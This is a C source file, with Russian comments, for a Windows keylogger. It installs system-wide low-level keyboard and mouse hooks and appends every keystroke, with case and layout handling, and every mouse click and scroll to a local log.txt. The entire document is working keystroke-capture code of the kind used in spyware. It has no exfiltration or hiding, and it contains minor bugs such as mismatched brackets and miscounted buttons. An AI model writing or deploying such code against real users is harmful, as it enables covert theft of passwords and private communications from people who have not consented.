#include <stdio.h>
#include <Windows.h>

#define RUS 1049
#define ENG 1033
#define SIZE_STR 20
void WriteLogKey(LPWSTR wstr);
BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam);
DWORD LKey = 0, RKey = 0;


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
	HHOOK hHOOK = SetWindowsHookExW(WH_MOUSE_LL, LogMouse, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))	//функция ожидает системного сообщения
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);
	UnhookWindowsHookEx(hHOOK);
	return 0;
}
void WriteLogKey(LPWSTR wstr)
{
	FILE* file = NULL;
	if (!_wfopen_s(&file, L"log.txt", L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), file);
	}
	fclose(file);
}

BOOL IsCaps(void)
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)	//клава-кока
{
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5))
			iKey |= 0x1 << 24;
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
		if (wcslen(KeyString) > 1)
		{
			WriteLogKey(L"[");
			WriteLogKey(KeyString);
			WriteLogKey(L"] ");
		}
		else
		{
			if (!IsCaps()) KeyString[0] = tolower(KeyString[0]);
			WriteLogKey(KeyString);
		}
		free(KeyString);
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam)	//мышка-норушка
{
	if (wParam == 513)
	{
		LKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Левая кнопка мишки");
		WriteLogKey(String);
		WriteLogKey(L"] ");
		free(String);
	}
	if (wParam == 516)
	{
		RKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Правая кнопка");
		WriteLogKey(L"[");
		WriteLogKey(String);
		WriteLogKey(L"] ");
		free(String);
	}
	if (wParam == 519)
	{
		RKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Средняя кнопка мышки");
		WriteLogKey(L"[");
		WriteLogKey(String);
		WriteLogKey(L"] ");
		free(String);
	}
	if (wParam == 522)
	{
		RKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Скролл мышки");
		WriteLogKey(L"[");
		WriteLogKey(String);
		WriteLogKey(L"] ");
		free(String);
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}
